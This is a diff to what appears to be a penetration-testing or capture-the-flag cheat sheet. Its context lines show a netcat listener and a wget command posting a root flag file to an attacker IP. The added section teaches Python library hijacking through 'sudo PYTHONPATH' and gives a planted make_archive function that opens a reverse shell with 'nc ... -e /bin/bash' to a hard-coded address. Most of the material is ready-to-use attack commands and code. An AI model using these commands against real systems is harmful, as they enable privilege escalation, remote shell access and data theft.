@@ -90,3 +90,25 @@ Create the password you want to add: "openssl passwd -1 -salt [salt] [password]"
 [Attacker] Setup a NC listener for the file we want to capture: $sudo nc -nlvp 80 > root.txt
 [Victim] Send the file with wget: sudo /usr/bin/wget --post-file=/root/root_flag.txt <attacker ip>
 ```
+
+## Python Library Privilege Escalation
+```
+[*] If the system allows for the manipulation of the path variable, and the script runs in an elevated manner, we may be able to control the flow, and escalation privileges
+[URL] https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+[URL] https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
+[URL] https://askubuntu.com/questions/250929/pythonpath-environment-variable
+
+[*] The trick is really exporting the PYTHONPATH variable; pay attention to the details on exporting the path and knowing what the script argumets are
+
+sudo PYTHONPATH=/var/tmp /opt/location/malicious-script.sh
+
+e.g.: sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh
+[NOTE] Within admin_tasks.sh there is a call to shutil, which imports make_archive
+
+[CODE]
+
+import os
+def make_archive(a,b,c):
+    os.system("nc 10.10.14.49 443 -e '/bin/bash'")
+
+```
